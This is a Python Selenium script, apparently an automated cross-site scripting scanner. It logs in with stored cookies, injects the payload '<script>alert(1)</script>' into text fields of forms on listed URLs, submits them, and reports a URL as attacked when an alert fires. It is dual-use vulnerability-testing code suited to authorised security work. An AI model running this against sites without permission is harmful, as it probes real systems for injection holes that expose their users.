import spider
from selenium import webdriver
from time import sleep
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC


chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--hide-scrollbars')
chrome_options.add_argument('window-size=1920x3000')
chrome_options.add_argument('blink-settings=imagesEnabled=false')

payloads = [r'"<script>alert(1)</script>"']
xssLinks = []
xssFlag = False

br = webdriver.Chrome(chrome_options=None)
br.get(spider.url)
tmp_dict = {}
tmp_dict['path'] = '/'
for key in spider.myCookies:
    tmp_dict['name'] = key
    tmp_dict['value'] = spider.myCookies[key]
    br.add_cookie(tmp_dict)


form_url_sequence = []
with open('testdata.txt','r') as f:
    test_list = f.readlines()

for each_href in test_list:
    form_url_sequence.append(each_href.replace('\n',''))

txt_input_list = []
for url_with_form in form_url_sequence:
    txt_input_list.clear()
    print("Testing %s:\t" %(url_with_form),end='')
    br.get(url_with_form)
    form_tags = br.find_elements_by_tag_name('form')
    for each_form in form_tags:
        if xssFlag:
            break
        for payload in payloads:
            try:
                input_tag = each_form.find_element_by_tag_name('input')
                if input_tag.get_attribute('type') in ['text','textarea']:
                    input_tag.clear()
                    input_tag.send_keys(payload)
                    txt_input_list.append(input_tag.get_attribute('name'))
            except:
                pass
            try:
                textarea_tag = each_form.find_element_by_tag_name('textarea')
                textarea_tag.clear()
                textarea_tag.send_keys(payload)
                txt_input_list.append(textarea_tag.get_attribute('name'))
            except:
                pass

            # 如果输入数据的话就像点击发送
            if len(txt_input_list):
                each_form.submit()
            else:
                # 如果没有可以输入数据的入口，就放弃该form
                break

            result = EC.alert_is_present()(br)
            if result:
                result.accept()
                xssLinks.append(url_with_form)
                xssFlag = True
                break
            # if payload in br.page_source:
            #     xssLinks.append(url_with_form)
            #     xssFlag = True
            #     break
    if xssFlag is False:
        print('failed')
    else:
        print("successfully attack!")
        xssFlag = False





    # for each_form in form_tags:
    #     if xssFlag:
    #         break
    #     for payload in payloads:
    #         input_tags = each_form.find_elements_by_tag_name('input')
    #         for each_input in input_tags:
    #             if each_input.get_attribute('type') in ['text','textarea']:
    #                 each_input.clear()
    #                 each_input.send_keys(payload)
    #         textarea_tags = each_form.find_elements_by_tag_name('textarea')
    #         for each_textarea in textarea_tags:
    #             each_textarea.clear()
    #             each_textarea.send_keys(payload)
    #         each_form.submit()
    #         if payload in br.page_source:
    #             xssLinks.append(url_with_form)
    #             xssFlag = True
    #             print('\tsuccessfully attack')
    #             break
    # if xssFlag is False:
    #     xssFlag = True
    #     print("\tfailed")